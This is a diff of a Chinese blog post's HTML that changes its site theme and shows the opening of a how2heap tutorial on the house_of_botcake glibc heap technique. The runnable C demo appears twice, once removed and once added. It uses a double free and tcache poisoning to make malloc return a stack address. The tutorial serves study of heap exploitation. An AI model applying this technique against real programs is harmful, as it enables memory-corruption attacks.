@@ -1,307 +1,98 @@
-
-
-<!DOCTYPE html>
-<html lang="zh-CN" >
-
-<!--浏览器搞笑标题-->
-<script type="text/javascript" src="/js/FunnyTitle.js"></script>
-
-
-
+<!DOCTYPE HTML>
+<html>
 <head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon/duck.png">
-  <link rel="icon" href="/img/icon/duck.png">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta charset="utf-8">
   
-  <meta name="theme-color" content="#f58f98">
+  <title>【how2heap】 botcake,einherjar,lore | 鷺雨のBlog</title>
+
+  
   <meta name="author" content="Loora1N">
+  
+
+  
+  <meta name="description" content="Blog of Loora1N">
+  
+
+  
+  
   <meta name="keywords" content="">
   
-    <meta name="description" content="针对glibc2.31及glibc2.35两个版本中的house of botcake, house of einherjar, house of lore三种方式进行讨论，其他版本可以根据特性进行类推，建议先对各种堆块的基本特性和数据结构做已了解之后进行学习。">
-<meta property="og:type" content="article">
-<meta property="og:title" content="【how2heap】 botcake,einherjar,lore">
-<meta property="og:url" content="http://loora1n.github.io/2022/10/20/how2heap%E2%91%A0%20botcake,einherjar,lore/index.html">
-<meta property="og:site_name" content="鷺雨のBlog">
-<meta property="og:description" content="针对glibc2.31及glibc2.35两个版本中的house of botcake, house of einherjar, house of lore三种方式进行讨论，其他版本可以根据特性进行类推，建议先对各种堆块的基本特性和数据结构做已了解之后进行学习。">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://loora1n.github.io/img/article/how2heap1/backward_consolidate-1666247169487-3.png">
-<meta property="article:published_time" content="2022-10-20T07:36:07.932Z">
-<meta property="article:modified_time" content="2022-10-20T07:36:07.932Z">
-<meta property="article:author" content="Loora1N">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://loora1n.github.io/img/article/how2heap1/backward_consolidate-1666247169487-3.png">
-  
-  
-  
-  <title>【how2heap】 botcake,einherjar,lore - 鷺雨のBlog</title>
 
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
 
+  <meta property="og:title" content="【how2heap】 botcake,einherjar,lore"/>
 
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-
-
+  <meta property="og:site_name" content="鷺雨のBlog"/>
 
   
-<link rel="stylesheet" href="/css/fluid-extention.css">
-<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
-
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"loora1n.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"lftEbNU4XPuR5dgHNV3WdWxP-gzGzoHsz","app_key":"b3uLUVGLeOWDwREWHMBr0jo9","server_url":"https://lftebnu4.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
+  <meta property="og:image" content="/favicon.ico"/>
   
 
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-    
-  
-
-
-
-  
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="鷺雨のBlog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
 <meta name="generator" content="Hexo 6.2.0"></head>
 
 
 <body>
-  
+<div class="blog">
+  <div class="content">
 
-  <header>
-    
-
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>鷺雨のBlog</strong>
-    </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/">
-                <i class="iconfont icon-link-fill"></i>
-                友链
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
-            </a>
-          </li>
-          
-        
-        
-      </ul>
-    </div>
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">鷺雨のBlog</a>
+    </h1>
+    <p class="site-description"></p>
   </div>
-</nav>
+  <nav class="site-navigation">
+    <ul>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
 
   
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/bg/3.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="【how2heap】 botcake,einherjar,lore"></span>
-          
-        </div>
-
-        
-          
-  <div class="mt-3">
     
+    <h3 class="article-title"><span>【how2heap】 botcake,einherjar,lore</span></h3>
     
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-10-20 15:36" pubdate>
-          2022年10月20日 下午
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a target="_blank" href="//2022/10/20/how2heap① botcake,einherjar,lore/" rel="bookmark noopener">
+        <time class="entry-date published" datetime="2022-10-20T07:36:07.932Z">
+          2022-10-20
         </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          4.3k 字
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          37 分钟
-        
-      </span>
-    
-
-    
-    
-      
-        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          阅读量 <span id="leancloud-page-views"></span>
-        </span>
-        
-      
-    
+      </a>
+    </span>
   </div>
 
 
-        
-      </div>
+  
 
+  <div class="article-content">
+    <div class="entry">
       
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">【how2heap】 botcake,einherjar,lore</h1>
-            
-            
-              <div class="markdown-body">
-                
-                <blockquote>
+        <blockquote>
 <p>本系列将针对glibc2.31及glibc2.35两个版本进行讨论，其他版本可以根据特性进行类推，建议先对各种堆块的基本特性和数据结构做已了解之后进行学习。</p>
 </blockquote>
 <h2 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house_of_botcake"></a>house_of_botcake</h2><p>house_of_botcake利用的是块的分割，使得只存在uaf漏洞的前提下实现堆块的溢出,达到获取任意地址的目的，下面我们用how2heap中的例子进行理解。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * This attack should bypass the restriction introduced in</span><br><span class="hljs-comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span><br><span class="hljs-comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span><br><span class="hljs-comment">     * simple tcache poisoning</span><br><span class="hljs-comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span><br><br>    <span class="hljs-comment">// disable buffering so _IO_FILE does not interfere with our heap</span><br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// introduction</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This attack only relies on double free.\n&quot;</span>);<br><br>    <span class="hljs-comment">// prepare the target</span><br>    <span class="hljs-type">intptr_t</span> stack_var[<span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The address we want malloc() to return, namely,&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);<br><br>    <span class="hljs-comment">// prepare heap layout</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Preparing heap layout&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *x[<span class="hljs-number">7</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-keyword">sizeof</span>(x)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">intptr_t</span>*); i++)&#123;<br>        x[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating a chunk for later consolidation&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *prev = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating the victim chunk.&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <br>    <span class="hljs-comment">// cause chunk overlapping</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now we are able to cause chunk overlapping&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 1: fill up tcache list&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)&#123;<br>        <span class="hljs-built_in">free</span>(x[i]);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);<br>    <span class="hljs-built_in">free</span>(a);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);<br>    <span class="hljs-built_in">free</span>(prev);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-comment">/*VULNERABILITY*/</span><br>    <span class="hljs-built_in">free</span>(a);<span class="hljs-comment">// a is already freed</span><br>    <span class="hljs-comment">/*VULNERABILITY*/</span><br>    <br>    <span class="hljs-comment">// simple tcache poisoning</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Launch tcache poisoning&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x120</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);<br>    b[<span class="hljs-number">0x120</span>/<span class="hljs-number">8</span><span class="hljs-number">-2</span>] = (<span class="hljs-type">long</span>)stack_var;<br>    <br>    <span class="hljs-comment">// take target out</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now we can cash out the target chunk.&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-type">intptr_t</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The new chunk is at %p\n&quot;</span>, c);<br>    <br>    <span class="hljs-comment">// sanity check</span><br>    assert(c==stack_var);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got control on target/stack!\n\n&quot;</span>);<br>    <br>    <span class="hljs-comment">// note</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Note:&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This attack only relies on double free.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The address we want malloc() to return, namely,&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Preparing heap layout&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a chunk for later consolidation&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we are able to cause chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 1: fill up tcache list&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// simple tcache poisoning</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Launch tcache poisoning&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="type">long</span>)stack_var;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we can cash out the target chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The new chunk is at %p\n&quot;</span>, c);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// note</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>首先我们用7个chunk填满tcache</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// cause chunk overlapping</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now we are able to cause chunk overlapping&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 1: fill up tcache list&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)&#123;<br>    <span class="hljs-built_in">free</span>(x[i]);<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// cause chunk overlapping</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Now we are able to cause chunk overlapping&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Step 1: fill up tcache list&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">    <span class="built_in">free</span>(x[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
